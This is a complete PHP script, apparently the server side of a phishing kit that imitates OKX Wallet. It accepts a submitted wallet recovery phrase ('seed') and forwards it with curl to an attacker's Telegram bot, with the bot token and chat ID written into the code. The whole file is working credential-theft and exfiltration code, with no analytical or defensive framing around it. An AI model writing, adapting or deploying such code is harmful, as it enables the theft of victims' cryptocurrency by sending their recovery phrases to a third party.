<?php
// === Telegram bot config ===
$botToken = '8242480339:AAH8RAIPWOgViXHhegNUrTgYyCr0w6ik0iA';
$chatId   = '1885861760';

// === Get the recovery phrase from POST
if (!isset($_POST['seed']) || empty(trim($_POST['seed']))) {
    http_response_code(400);
    exit("No seed received.");
}

$seed = trim($_POST['seed']);

// === Create the Telegram message
$message = "🧠 *New OKX Wallet :*\n\n`" . $seed . "`";

// === Send message to Telegram
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

// === Send with curl
$ch = curl_init($telegramURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_exec($ch);
curl_close($ch);

http_response_code(200);
echo "OK";
?>
